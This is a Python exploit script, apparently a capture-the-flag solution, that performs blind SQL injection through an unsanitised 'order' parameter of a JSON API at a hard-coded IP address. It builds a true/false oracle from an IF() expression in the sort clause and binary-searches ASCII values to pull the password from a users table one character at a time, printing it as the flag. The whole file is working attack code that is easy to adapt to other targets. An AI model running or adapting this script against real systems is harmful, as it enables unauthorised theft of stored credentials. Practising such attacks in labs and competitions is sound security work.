#!/usr/bin/env python3
import json, sys, urllib.request

URL = "http://154.57.164.65:32130/api/list"

def ask(order):
    body = json.dumps({"order": order}).encode()
    req = urllib.request.Request(URL, data=body, headers={"Content-Type": "application/json"})
    with urllib.request.urlopen(req, timeout=10) as r:
        data = json.loads(r.read())
    if not isinstance(data, list) or not data:
        raise RuntimeError(f"bad response: {data}")
    return data[0]["id"]

# Oracle: IF(cond, title, location) -> first_id == 8 means cond TRUE
def cond_true(expr):
    order = f"IF(({expr}), title, location)"
    return ask(order) == 8

# Sanity
assert cond_true("1=1"), "oracle broken on TRUE"
assert not cond_true("1=2"), "oracle broken on FALSE"
print("[+] oracle good", flush=True)

# Leak password char by char via binary search on ASCII 32..126
secret = ""
for pos in range(1, 80):
    # ORD of char at pos
    lo, hi = 32, 126
    while lo < hi:
        mid = (lo + hi) // 2
        if cond_true(f"ASCII(SUBSTRING((SELECT password FROM users LIMIT 1),{pos},1))>{mid}"):
            lo = mid + 1
        else:
            hi = mid
    ch = chr(lo)
    secret += ch
    print(f"[{pos:02d}] = {ch!r}   so_far={secret}", flush=True)
    if ch == "}":
        break

print(f"\nFLAG: {secret}")
